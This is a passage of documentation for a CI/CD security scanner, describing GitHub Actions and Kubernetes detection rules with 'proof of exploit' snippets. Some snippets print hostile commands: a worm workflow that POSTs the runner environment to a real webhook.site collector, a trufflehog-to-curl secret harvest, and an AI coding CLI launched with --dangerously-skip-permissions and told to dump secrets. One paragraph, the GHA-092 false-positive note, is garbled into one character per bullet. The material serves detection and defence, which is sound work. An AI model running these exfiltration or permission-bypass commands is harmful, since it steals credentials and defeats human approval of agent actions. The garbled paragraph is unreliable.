    outputs:
      release-tag:
        description: "tag produced"
        value: ${{ jobs.fetch.outputs.tag }}
```

**Source:** [`GHA-055`](../providers/github.md#gha-055) in the [GitHub Actions provider](../providers/github.md).

### `GHA-056`: Workflow body contains a known supply-chain worm indicator <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-056 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Distinct from GHA-027 (which fires on behavioral primitives, reverse shells, base64-decoded exec, exfil-channel domains) and from GHA-048 / GHA-049 (which fire on the *write* or *push* primitives). GHA-056 fires on the *literal IOC* — the filenames, repo names, and webhook UUIDs that surfaced in the published worm payloads. Currently covers:

* ``shai-hulud-workflow.yml`` — the workflow file the Shai-Hulud worm dropped into every writable repo.
* Webhook UUID ``bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`` — the Shai-Hulud webhook.site collector path.
* ``Shai-Hulud`` / ``Shai-Hulud Migration`` — the public exfil repo names the worm created under each victim's account.
* ``s1ngularity-repository*`` — the Nx-attack public exfil repo name pattern.

The IOC list is curated and append-only, mirroring the shape of ``_compromised_actions.py`` / ``_compromised_packages.py``. Refresh by PR with the vendor advisory cited in the commit.

**Recommendation.** Treat this workflow as already-compromised, not at-risk. A literal worm IOC in the YAML means either the file was written by a worm payload (Shai-Hulud / s1ngularity), or someone hard-coded the IOC for a reason that needs a paper trail. Required steps: (1) preserve the file, do not just revert it; (2) rotate every credential the runner can reach (GITHUB_TOKEN-scoped + every secret referenced anywhere in ``.github/``); (3) audit GitHub audit log for the time window between the IOC appearing and the rotation completing; (4) check the org for sibling repos with the same IOC (the worm propagated). If the literal is intentional (a detection fixture, a red-team exercise), suppress with ``.pipelinecheckignore`` carrying an ``expires:`` date — never permanently.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise workflows legitimately carry these IOC strings as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare literals in a production workflow still fire.
- Detection / threat-intel repos that maintain IOC lists in checked-in YAML are the expected source of legitimate hits. Suppress on the specific file with a rationale that names the repo's purpose.

**Seen in the wild.**

- Shai-Hulud npm worm (Sept 2025): the worm wrote ``.github/workflows/shai-hulud-workflow.yml`` into every repo the stolen GITHUB_TOKEN could reach; the dropped workflow then POSTed harvested secrets to ``webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`` and pushed a sibling copy into a public ``Shai-Hulud`` repo under the victim's account.
- Nx s1ngularity compromise (Aug 2025): the malicious postinstall pushed harvested secrets to public ``s1ngularity-repository*`` repos created under the victim's account via ``gh repo create``.

**Proof of exploit.**

```
# Vulnerable: the IOC strings below are literal Shai-Hulud /
# s1ngularity indicators. A workflow containing any of them
# is post-compromise evidence, not pre-compromise risk.
name: shai-hulud
on: push
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X POST \
            https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 \
            -d @<(env)
          gh repo create "$USER/s1ngularity-repository-$RANDOM" --public
          git push "$USER/Shai-Hulud-Migration" main

# Safe: there is no legitimate version of this workflow.
# Delete it, rotate every credential the runner can reach,
# and audit the org for sibling drops.
```

**Source:** [`GHA-056`](../providers/github.md#gha-056) in the [GitHub Actions provider](../providers/github.md).

### `GHA-057`: Secret-scanner output sent to network egress <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-057 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Three shapes fire:

1. ``trufflehog`` / ``gitleaks`` invocation in a ``run:`` block whose stdout pipes to ``curl`` / ``wget`` / ``nc`` / ``gh api -X POST`` — this is the harvest leg of the Shai-Hulud worm postinstall and any similar credential-stealer primitive.
2. ``trufflehog`` / ``gitleaks`` invoked unconditionally on a workflow whose triggers include ``pull_request_target``, ``issue_comment``, or ``workflow_run`` — the scanner is running with privileged secrets on an attacker-influenced trigger, so even if the output isn't piped to egress today, the next person editing the workflow can land that change via a PR comment.
3. ``curl`` / ``wget`` / ``httpie`` POST/PUT/PATCH (or ``--data`` upload) to a non-GitHub host whose payload references ``${{ secrets.* }}``, a credential-named env var (``$GITHUB_TOKEN``, ``$NPM_TOKEN``, ``$AWS_*`` keys, etc.), or dumps the runner env (``$(env)``, ``$(printenv)``, ``env > ...``). Catches the third-party-webhook exfil shape where the scanner doesn't run at all — the workflow simply POSTs a build-telemetry payload to an external service that, if the domain lapses or the service is breached, leaks every downstream build's env (which includes ``GITHUB_TOKEN`` always, plus any mapped ``${{ secrets.* }}``). GitHub-owned hosts are allow-listed (``github.com``, ``api.github.com``, ``*.githubusercontent.com``, ``codecov.io`` for the canonical upload path).

Legitimate uses pass: scanner output written to ``${{ github.workspace }}`` or a file under the repo, output uploaded via ``github/codeql-action/upload-sarif`` (CodeQL API, not raw HTTP), and any invocation gated by a ``push``-to-default-branch ``if:`` predicate.

**Recommendation.** Stop piping secret-scanner output to a network egress tool. Legitimate scans write their findings to the workspace, the Code Scanning API (SARIF upload), or the workflow log — none of which involve ``curl`` / ``wget`` / ``nc`` / ``gh api POST``. If the scanner is run on a fork-PR-style trigger (``pull_request_target`` / ``issue_comment`` / ``workflow_run``), move it to a vanilla ``pull_request`` trigger so an attacker can't supply the scanner's configuration or scan path. Pin the scanner action to a commit SHA, not a tag, and gate the upload step behind a protected environment.

**Known false positives.**

- Security teams that run secret scanners and POST results to their own internal SOAR / ticketing system trip the egress leg of this rule. Suppress on the specific step with a rationale that names the destination host; the rule's default posture is that any scanner-to-network pipe is credential-exfil-shaped.

**Seen in the wild.**

- Shai-Hulud npm worm (Sept 2025): the postinstall payload ran TruffleHog against the filesystem and cloud metadata endpoints, then POSTed the discovered secrets to ``webhook.site/<uuid>`` and a public GitHub repo created by the worm. The TruffleHog leg is what made the secrets worth stealing; without it the worm would have nothing to exfiltrate.

**Proof of exploit.**

```
# Vulnerable: the scanner harvests secrets, the pipe sends
# them to a public collector. The Shai-Hulud postinstall
# ran an in-line equivalent of this exact pipeline.
jobs:
  harvest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          trufflehog filesystem . --json \
            | curl -X POST --data-binary @- \
                https://webhook.site/<uuid>

# Safe: the scanner runs, output is uploaded via the
# official Code Scanning API. No raw network egress.
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions: { security-events: write }
    steps:
      - uses: actions/checkout@<sha>
      - run: trufflehog filesystem . --json > findings.sarif
      - uses: github/codeql-action/upload-sarif@<sha>
        with: { sarif_file: findings.sarif }
```

**Source:** [`GHA-057`](../providers/github.md#gha-057) in the [GitHub Actions provider](../providers/github.md).

### `GHA-058`: Agentic CLI invoked with permission-bypass flags <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-058 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Two detections feed the rule. Either is enough for the finding to fire.

**A. Bypass-flag shape.** A ``run:`` body invokes one of the following CLIs with the matching permission-bypass flag:

* ``claude … --dangerously-skip-permissions``
* ``gemini … --yolo``
* ``q chat … --trust-all-tools``
* ``cursor-agent …`` (any unprotected invocation; the CLI's default mode is the unsafe one)
* any of the above with ``--allowedTools '*'`` / ``--allowedTools '.*'`` / ``--allowedTools all``
* ``aider`` / ``openhands`` / ``goose`` with equivalent ``--auto`` / ``--no-confirm`` / ``--full-auto`` flags.

Does NOT fire on a clearly-scoped invocation, e.g. ``claude --allowedTools 'Read,Grep'`` with a literal allow-list, or ``q chat --trust-tools 'fs_read'``.

**B. PR-checkout topology** (zizmor proposal #1605 / #1607). Step-order traversal within a job. Fires when an agentic CLI (any of the names above) runs in a step *after* a step that checked out a PR head (``actions/checkout`` with ``ref:`` interpolating ``github.event.pull_request.head.*``, ``github.head_ref``, or a ``refs/pull/*/head`` literal) AND a write-scope token is in scope for the job (job-level ``permissions: write-all``, any token granted ``write``, ``id-token: write``, or no ``permissions:`` block declared anywhere, since the runtime default carries ``contents: write`` on most triggers). Pairs with GHA-045 (caller-controlled ref) and GHA-046 (manual PR-head fetch), the agentic-CLI primitive turns a contributor-controlled tree into a token-exfil tool, no bypass flag needed.

**Recommendation.** Don't run an agentic CLI (claude / gemini / q / cursor-agent / aider / openhands / goose) with its safety flags disabled inside CI. The flags ``--dangerously-skip-permissions``, ``--yolo``, ``--trust-all-tools``, ``--allowedTools "*"`` let the agent shell out, read arbitrary files, and post to arbitrary HTTP endpoints with no per-action prompt — under the runner's identity. In CI that means it can read every ``${{ secrets.* }}`` value the workflow has access to and POST them anywhere. Either drop the bypass flag (and accept the manual confirmation prompts CI can't satisfy, so don't run it in CI at all), or gate the step behind a protected ``environment:`` and pre-vet the prompt that's being fed to the agent.

**Known false positives.**

- Internal tooling that legitimately runs an agentic CLI in CI (e.g. a doc-generation job) might pass a bypass flag for convenience. The right fix is to scope the allow-list rather than suppress the rule. If suppression is truly the only path, do it on the specific step with a rationale that names which tools the agent is allowed to invoke.

**Seen in the wild.**

- Nx s1ngularity compromise (Aug 2025): the malicious postinstall payload looked for ``claude``, ``gemini``, and ``q`` on PATH and invoked them with ``--dangerously-skip-permissions`` / ``--yolo`` / ``--trust-all-tools`` plus a prompt that walked the filesystem and emitted any secret-shaped values. The same primitive in a CI workflow turns the runner's secrets into an open buffet for whoever can land a PR. https://nx.dev/blog/s1ngularity-postmortem

**Proof of exploit.**

```
# Vulnerable: the bypass flag turns the agent into an
# unattended shell that can read ``${{ secrets.* }}`` and
# POST anywhere on the internet. This is the s1ngularity
# postinstall pattern lifted into a workflow.
jobs:
  agentic:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          npm i -g @anthropic-ai/claude-code
          claude --dangerously-skip-permissions \
            -p 'walk the filesystem and dump anything secret-shaped'

# Safe: the agent runs with a literal tool allow-list, no
# blanket bypass. The job is also environment-gated so the
# prompt itself is reviewed before execution.
jobs:
  agentic:
    runs-on: ubuntu-latest
    environment: agentic-review
    steps:
      - uses: actions/checkout@<sha>
      - run: claude --allowedTools 'Read,Grep' -p "$PROMPT"
```

**Source:** [`GHA-058`](../providers/github.md#gha-058) in the [GitHub Actions provider](../providers/github.md).

### `GHA-059`: npm install without registry-signature verification step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-059 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Fires once per workflow when:

1. The workflow runs at least one npm / pnpm install command (``npm ci``, ``npm install``, ``npm i``, ``pnpm install``, ``pnpm i``, ``pnpm ci``);
2. No step anywhere in the workflow runs ``npm audit signatures`` or ``pnpm audit signatures``.

Yarn / Bun-only workflows pass silently because the ``audit signatures`` primitive is npm-CLI-specific (Yarn Berry's equivalent ``yarn npm audit`` does not yet verify registry trusted-publisher signatures; Bun has no equivalent step). The rule pairs with NPM-002 (lockfile entry missing integrity hash) and NPM-006 (known-compromised package version): NPM-002 / NPM-006 verify *what* the lockfile pinned, and GHA-059 verifies the lockfile pinned what the maintainer actually signed.

**Recommendation.** Add an ``npm audit signatures`` step (or ``pnpm audit signatures``) after the install step. Lockfile pinning guarantees installed bytes match what the lockfile recorded; ``audit signatures`` verifies those bytes were signed by the registry-trusted publisher for the package. Without it, a compromised maintainer account can publish a malicious version that the next lockfile refresh will pin and install without complaint, because integrity-only checks have no view into who actually signed the bytes. Place the step after ``npm ci`` / ``pnpm install`` and before any code from ``node_modules/`` runs (``npm run build``, test, publish).

**Known false positives.**

- Workflows that build and test against a private registry without trusted-publisher records (legacy Artifactory, self-hosted Verdaccio without sigstore integration) cannot run ``npm audit signatures`` meaningfully — the registry has no signatures to verify against. Suppress this rule on the specific workflow with a rationale that names the private registry; revisit when the registry adds trusted-publisher support.
- Workflows whose only install command is ``npm install --no-save`` for a one-off tool (linter, doc generator) without a lockfile in the repo. Suppress if signature verification adds no signal because nothing is pinned in the first place; the right fix is usually to add the lockfile, not suppress the rule.

**Seen in the wild.**

- Shai-Hulud npm worm (2026) / TanStack / axios patch-release compromises: each abused the gap between lockfile-pinned integrity and registry-signed-publisher provenance. The lockfile faithfully pinned what the maintainer's account published; ``npm audit signatures`` would have flagged that the bytes weren't signed by the trusted-publisher record on file with the registry.

**Source:** [`GHA-059`](../providers/github.md#gha-059) in the [GitHub Actions provider](../providers/github.md).

### `GHA-060`: pip install without `--require-hashes` verification <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-060 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Fires once per workflow when:

1. The workflow runs a real ``pip install`` invocation (``pip install``, ``pip3 install``, ``python -m pip install``, ``python3 -m pip install``) that isn't a tooling-bootstrap exempted by the allowlist;
2. No invocation in the workflow passes ``--require-hashes`` AND no step uses a lockfile-consuming manager (``uv sync`` / ``uv pip sync``, ``poetry install``, ``pipenv install --deploy`` / ``pipenv sync``).

Tooling-bootstrap allowlist (silent-passes): ``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``, ``pip install --upgrade pip-tools``, ``pip install pipx``, ``pip install pip-audit / cyclonedx-bom / semgrep``. These are the same shapes GL-022 / BB-022 exempt for the dep-update rule.

Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the package-side: PYPI-002 verifies *what* the requirements file pinned, GHA-060 verifies the install command actually consumes those pins.

**Recommendation.** Pin every dependency with a SHA-256 hash and install with ``pip install -r requirements.txt --require-hashes``. The hash-pinned mode refuses to install any package whose downloaded tarball doesn't match a recorded SHA-256, which is the equivalent of npm's lockfile-integrity guarantee for PyPI. Generate the hashes with ``pip-compile --generate-hashes`` (from ``pip-tools``) or migrate to a package manager that hash-pins by default: ``uv sync`` (reads ``uv.lock``), ``poetry install`` (reads ``poetry.lock``), or ``pipenv install --deploy`` (reads ``Pipfile.lock``). The rule silent-passes when any of those managers runs in the same workflow.

**Known false positives.**

- Pipelines that build against a private index without SHA-256 hash records (legacy DevPI, self-hosted simple indexes without per-file hashes) cannot run ``--require-hashes`` meaningfully. Suppress on the specific workflow with a rationale that names the private index.
- One-off tool installs that aren't on the allowlist but are genuinely bootstrap-only (e.g. ``pip install some-niche-linter``). The right fix is usually to install via the lockfile-managed venv; if not feasible, suppress on the specific step.

**Seen in the wild.**

- PyPI maintainer-account compromises (ctx 2022, requests-darwin-lite 2024) shipped malicious sdists / wheels under existing version pins. ``--require-hashes`` would have refused the swapped artifact because the recorded SHA-256 wouldn't match the malicious tarball.

**Source:** [`GHA-060`](../providers/github.md#gha-060) in the [GitHub Actions provider](../providers/github.md).

### `GHA-061`: GitHub App token minted without a `permissions:` filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-061 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Fires when a step uses one of the known App-token minting actions without a ``with.permissions`` input:

- ``actions/create-github-app-token`` (the official action; the canonical pattern documented on the GitHub Apps + Actions page).
- ``tibdex/github-app-token`` (the older community action that the official one replaced; many workflows still pin it).
- ``peter-murray/workflow-application-token-action`` (similar shape, older.)

The rule is shape-only and doesn't inspect what the App is actually installed with. That's intentional: the scanner can't see the org-side install record, so the right contract is 'always declare the scopes you need at mint time'. Pairs with GHA-050 (publish without OIDC) on the long-lived-credential axis: GHA-050 covers static registry tokens minted by the operator, GHA-061 covers short-lived App tokens that nonetheless carry org-wide scope.

**Recommendation.** Pass an explicit ``permissions:`` filter when minting a GitHub App installation token. The minted token will then carry only the requested scopes even if the App's install grants more. Example:

    - id: app-token
      uses: actions/create-github-app-token@<sha>
      with:
        app-id: ${{ secrets.RELEASE_APP_ID }}
        private-key: ${{ secrets.RELEASE_APP_KEY }}
        permissions: >-
          {"contents":"write"}

List every scope the consuming steps actually need; a future reader (and an attacker who lands a step in this job) can then see exactly what the token can do. Apps are commonly installed with broad org-wide scopes (``contents: write, packages: write, actions: write, pull-requests: write, ...``) because granular per-install permissions are tedious; without the filter the runner token inherits every one of them.

**Known false positives.**

- A workflow that genuinely needs every scope the App carries (rare; usually a release-orchestrator job that writes ``contents`` + ``packages`` + ``deployments`` + ``actions``). The right response is still to list those scopes explicitly so the breadth is documented, not to suppress the rule.
- First-publish bootstrap on a brand-new App install where the available scopes haven't been finalized yet. Suppress on the specific step until the App install settles.

**Seen in the wild.**

- zizmor's ``github-app`` audit (2025) flagged this shape after multiple incident reviews showed Apps installed with broad scopes minting full-scope tokens for jobs that only needed ``contents: write``. The runtime cost of one missing ``permissions:`` line is the same as a PAT with all those scopes leaked into the runner.

**Proof of exploit.**

```
# Vulnerable: token inherits every permission the App
# install grants on the org (commonly contents: write,
# packages: write, actions: write, pull-requests: write,
# deployments: write, ...). Any later step that lands
# attacker-controlled shell exfils a token whose blast
# radius is 'everything the App can do' rather than the
# single scope this job actually needed.
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - id: app-token
        uses: actions/create-github-app-token@<sha>
        with:
          app-id: ${{ secrets.RELEASE_APP_ID }}
          private-key: ${{ secrets.RELEASE_APP_KEY }}
          owner: ${{ github.repository_owner }}
      - uses: actions/checkout@<sha>
        with:
          token: ${{ steps.app-token.outputs.token }}
      - run: git push --follow-tags

# Safe: explicit scope list. Token can push tags and
# nothing else, even if the App install carries more.
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - id: app-token
        uses: actions/create-github-app-token@<sha>
        with:
          app-id: ${{ secrets.RELEASE_APP_ID }}
          private-key: ${{ secrets.RELEASE_APP_KEY }}
          owner: ${{ github.repository_owner }}
          permissions: >-
            {"contents":"write"}
      - uses: actions/checkout@<sha>
        with:
          token: ${{ steps.app-token.outputs.token }}
      - run: git push --follow-tags
```

**Source:** [`GHA-061`](../providers/github.md#gha-061) in the [GitHub Actions provider](../providers/github.md).

### `GHA-062`: OIDC subject claim in sibling IaC grants overly broad scope <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-062 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Walks the workflow's containing repo (depth-bounded, skipping ``node_modules`` / ``vendor`` / ``.git`` / build dirs) for two sidecar IaC file shapes when the workflow uses an OIDC cloud-credentials action:

1. **AWS trust policy.** Any ``*.json`` whose body parses to an IAM trust document that references ``token.actions.githubusercontent.com`` as a Federated principal AND whose ``Condition.StringLike`` ``...:sub`` value contains ``*`` in the ``repo:`` or ``repo:<org>/`` segment (``repo:*``, ``repo:<org>/*``, ``repo:<org>/*:*``). The branch / environment / ref segment may legitimately carry ``*``; only the org/repo segment is flagged.
2. **GCP Workload Identity Federation.** Any ``*.tf`` containing a ``google_iam_workload_identity_pool_provider`` block whose ``attribute_condition`` is a ``startsWith`` or ``matches`` predicate against ``attribute.repository`` with a value that ends in a ``/`` slash (org prefix, no specific repo). Tighter conditions (``attribute.repository == 'myorg/myrepo'``) are skipped.

Fires once per offending IaC file with a finding location pointing at the file. The walk is cached per scan so adding this rule doesn't compound the cost of GHA-030 / IAM-008. Pairs with GHA-030 (workflow-side environment binding) and IAM-008 (live AWS IAM audit); this leg covers the static IaC checked into the repo.

**Recommendation.** Pin the OIDC subject claim to a specific repository (and ideally a specific branch / environment ref). For AWS IAM trust policies, replace ``StringLike`` ``token.actions.githubusercontent.com:sub`` values like ``repo:*`` or ``repo:<org>/*`` with ``repo:<org>/<repo>:ref:refs/heads/main`` (or ``:environment:<name>`` for environment-scoped tokens). For GCP Workload Identity Federation, replace ``attribute_condition`` predicates that only check the org prefix (``attribute.repository.startsWith('myorg/')``) with an equality on the exact ``<org>/<repo>`` plus branch / environment attributes.

**Known false positives.**

- Test fixtures and documentation samples that intentionally embed permissive trust policies (e.g. cicd-goat's ``scenarios/10-oidc-aws-wildcard-sub/trust-policy.json`` itself, when scanned in-place). Suppress with a path filter on the specific test directory. The rule is intentionally broad on file-name match so a renamed ``my-prod-trust-policy.json`` still surfaces.

**Seen in the wild.**

- Multiple post-disclosure writeups of GitHub-to-AWS OIDC misconfigurations (Cider Security 2022, Datadog 2023, AquaSec 2024) traced the issue to a ``repo:*`` or ``repo:org/*`` ``StringLike`` subject pattern that was kept as a stop-gap during initial onboarding and never tightened. Any fork PR or any newly-created org repo could mint a production-role token until the policy was edited.

**Proof of exploit.**

```
# Vulnerable trust-policy.json (any repo can assume):
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated":
      "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
      "StringLike":   {"token.actions.githubusercontent.com:sub": "repo:*"}
    }
  }]
}

# Safe — pinned to one repo + main branch:
"StringLike": {"token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"}
```

**Source:** [`GHA-062`](../providers/github.md#gha-062) in the [GitHub Actions provider](../providers/github.md).

### `GHA-092`: PR head SHA captured then re-fetched (force-push race) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-092 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Within a single job, step-order traversal looks for:

1. A **capture** step, any step that reads ``github.event.pull_request.head.sha`` (either as a ``${{ }}`` interpolation in a ``run:`` body, in a step or job ``env:`` block, or via a ``run:`` body containing ``git rev-parse HEAD`` after an earlier checkout).
2. A **fetch** step that follows it, an ``actions/checkout`` whose ``with.ref:`` contains the same ``${{ github.event.pull_request.head.sha }}`` expression.

The fire condition is the *order*, capture-then-fetch with no intervening lock on the ref. Workflows that do the fetch FIRST (and only read the SHA after) are not TOCTOU-shaped because there's only one read; pipeline-check stays silent. Cross-job state isn't covered because GitHub-Actions doesn't share a filesystem between jobs by default; ``needs:`` data passing via ``outputs:`` is a separate shape (TAINT-002 territory).

**Recommendation.** Read the PR head SHA once and reuse the captured value for the actual checkout. ``actions/checkout`` accepts a ``ref:`` the workflow already resolved (``ref: ${{ steps.snap.outputs.sha }}`` after a ``steps.snap`` that captures the SHA from the event payload), so the same atom drives both the gate decision and the fetch. If a re-read is genuinely needed (you want the latest commit, accepting the race), drop the gate logic that depends on the earlier snapshot, the two are not the same primitive.

**Known false positives.**

- I
- f
- 
- t
- h
- e
- 
- w
- o
- r
- k
- f
- l
- o
- w
- 
- g
- e
- n
- u
- i
- n
- e
- l
- y
- 
- w
- a
- n
- t
- s
- 
- t
- o
- 
- t
- r
- a
- c
- k
- 
- H
- E
- A
- D
- -
- o
- f
- -
- P
- R
- 
- o
- v
- e
- r
- 
- t
- i
- m
- e
- 
- (
- e
- .
- g
- .
- ,
- 
- a
- 
- l
- o
- n
- g
- -
- r
- u
- n
- n
- i
- n
- g
- 
- r
- e
- v
- i
- e
- w
- 
- s
- e
- s
- s
- i
- o
- n
- 
- t
- h
- a
- t
- 
- p
- i
- c
- k
- s
- 
- u
- p
- 
- a
- d
- d
- i
- t
- i
- o
- n
- a
- l
- 
- c
- o
- m
- m
- i
- t
- s
- 
- b
- e
- t
- w
- e
- e
- n
- 
- g
- a
- t
- e
- 
- a
- n
- d
- 
- m
- e
- r
- g
- e
- )
- ,
- 
- t
- h
- e
- 
- T
- O
- C
- T
- O
- U
- 
- s
- h
- a
- p
- e
- 
- i
- s
- n
- '
- t
- 
- t
- h
- e
- 
- b
- u
- g
- ,
- 
- t
- h
- e
- 
- d
- e
- s
- i
- g
- n
- 
- i
- s
- .
- 
- S
- u
- p
- p
- r
- e
- s
- s
- 
- p
- e
- r
- -
- s
- t
- e
- p
- 
- w
- i
- t
- h
- 
- a
- 
- r
- a
- t
- i
- o
- n
- a
- l
- e
- 
- t
- h
- a
- t
- 
- e
- x
- p
- l
- a
- i
- n
- s
- 
- t
- h
- e
- 
- c
- o
- n
- t
- r
- a
- c
- t
- ;
- 
- p
- a
- i
- r
- 
- w
- i
- t
- h
- 
- a
- 
- b
- r
- a
- n
- c
- h
- -
- p
- r
- o
- t
- e
- c
- t
- i
- o
- n
- 
- r
- u
- l
- e
- 
- o
- n
- 
- t
- h
- e
- 
- c
- o
- n
- t
- r
- i
- b
- u
- t
- o
- r
- 
- s
- i
- d
- e
- 
- t
- h
- a
- t
- 
- b
- l
- o
- c
- k
- s
- 
- f
- o
- r
- c
- e
- -
- p
- u
- s
- h
- e
- s
- 
- t
- o
- 
- P
- R
- 
- b
- r
- a
- n
- c
- h
- e
- s
- 
- s
- o
- 
- t
- h
- e
- 
- r
- a
- c
- e
- 
- w
- i
- n
- d
- o
- w
- 
- s
- t
- a
- y
- s
- 
- c
- l
- o
- s
- e
- d
- 
- i
- n
- 
- p
- r
- a
- c
- t
- i
- c
- e
- .

**Seen in the wild.**

- GitHub Security Lab "checkout-after-rev-parse" research (2024) and zizmor proposal #935: red-team demonstrations of contributor force-pushes landing un-reviewed code between a workflow's two reads of the PR head SHA. The attack works against PR-review gates, labeler gates, and any approval-by-SHA workflow that uses the snapshot value for the decision and a live re-read for the build.

**Proof of exploit.**

```
# Vulnerable: two reads of the PR head, with a gate in
# between. A contributor force-push between the snapshot
# and the second checkout lets unreviewed code run with
# the gate's stamp of approval.
jobs:
  review-and-build:
    runs-on: ubuntu-latest
    steps:
      - id: snap
        run: echo "sha=${{ github.event.pull_request.head.sha }}" >> "$GITHUB_OUTPUT"
      - run: ./review-gate.sh ${{ steps.snap.outputs.sha }}
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}

# Safe: capture once, use the captured value for both the
# gate and the fetch. ``checkout`` accepts the resolved
# SHA as a ``ref:`` directly.
jobs:
  review-and-build:
    runs-on: ubuntu-latest
    steps:
      - id: snap
        run: echo "sha=${{ github.event.pull_request.head.sha }}" >> "$GITHUB_OUTPUT"
      - run: ./review-gate.sh ${{ steps.snap.outputs.sha }}
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ steps.snap.outputs.sha }}
```

**Source:** [`GHA-092`](../providers/github.md#gha-092) in the [GitHub Actions provider](../providers/github.md).

### `K8S-001`: Container image not pinned by sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-001 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Reuses ``_primitives.image_pinning.classify`` so the floating-tag semantics match DF-001 / GL-001 / JF-009 / ADO-009 / CC-003. Even a ``PINNED_TAG`` like ``nginx:1.25.4`` is treated as unpinned, only an explicit ``@sha256:`` survives, since a tag is mutable on the registry side and Kubernetes will happily pull the new content on a node restart.

**Recommendation.** Resolve every workload container image to its current digest (``crane digest <ref>`` or ``docker buildx imagetools inspect``) and pin via ``image: repo@sha256:<digest>``. Floating tags (``:latest``, ``:3``, no tag) silently swap the running image on the next rollout, breaking provenance and reproducibility.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``image: nginx:1.25`` is a mutable tag.
# Docker Hub's nginx team rebuilds it on every point
# release; a publisher takeover repoints the tag
# silently and every Pod that uses it picks up the
# substituted image on the next scheduling decision.
apiVersion: apps/v1
kind: Deployment
metadata: { name: web }
spec:
  template:
    spec:
      containers:
        - name: nginx
          image: nginx:1.25

# Safe: pin to the content-addressable digest. The
# kubelet refuses to start the Pod if the image's
# digest doesn't match the manifest.
apiVersion: apps/v1
kind: Deployment
metadata: { name: web }
spec:
  template:
    spec:
      containers:
        - name: nginx
          image: nginx@sha256:abc123...   # nginx:1.25.4
```

**Source:** [`K8S-001`](../providers/kubernetes.md#k8s-001) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-002`: Pod hostNetwork: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-002 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Compromised containers on hostNetwork can sniff or interfere with traffic from every other pod on the node. Reserve the flag for system DaemonSets that genuinely require it (CNI agents, ingress data planes); applications never need it.

**Recommendation.** Set ``spec.hostNetwork: false`` (the default) on every workload. ``hostNetwork: true`` puts the pod directly on the node's network namespace, exposing every host-bound listener to the container and bypassing CNI network policies.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``hostNetwork: true`` makes the Pod share
# the node's network namespace. The Pod can sniff every
# other Pod's traffic on the node, bind privileged
# ports, and (via raw sockets) MITM cluster-internal
# traffic.
apiVersion: v1
kind: Pod
metadata: { name: sniffer }
spec:
  hostNetwork: true
  containers:
    - name: app
      image: app@sha256:abc123...

# Safe: default Pod network namespace. The Pod gets a
# CNI-managed IP and can only talk on the cluster
# network through normal Service / Ingress paths.
apiVersion: v1
kind: Pod
metadata: { name: app }
spec:
  containers:
    - name: app
      image: app@sha256:abc123...
```

**Source:** [`K8S-002`](../providers/kubernetes.md#k8s-002) in the [Kubernetes provider](../providers/kubernetes.md).

